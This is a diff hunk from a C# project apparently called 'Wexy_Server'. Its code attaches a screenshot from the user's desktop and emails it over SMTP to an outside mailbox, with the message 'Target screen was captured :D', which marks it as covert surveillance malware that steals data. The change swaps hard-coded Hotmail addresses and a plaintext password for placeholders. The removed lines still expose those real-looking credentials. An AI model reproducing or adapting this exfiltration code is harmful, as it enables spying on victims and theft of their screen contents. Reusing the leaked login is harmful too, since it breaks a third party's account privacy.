@@ -170,13 +170,13 @@ namespace Wexy_Server
                 client.EnableSsl = true;
                 client.Timeout = 100000;
                 client.DeliveryMethod = SmtpDeliveryMethod.Network;
-                client.Credentials = new System.Net.NetworkCredential("welsenweas@hotmail.com", "n0n0CATA72");
+                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");
 
                 //Configure the mail to send
                 Attachment objAttachment = new Attachment(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
                 MailMessage msg = new MailMessage();
-                msg.To.Add("welsen971@hotmail.fr");
-                msg.From = new MailAddress("welsenweas@hotmail.com");
+                msg.To.Add("your_mail_receiver");
+                msg.From = new MailAddress("your_mail_sender");
                 msg.Attachments.Add(objAttachment);
                 msg.Subject = "New screenshot";
                 msg.Body = "Target screen was captured :D";
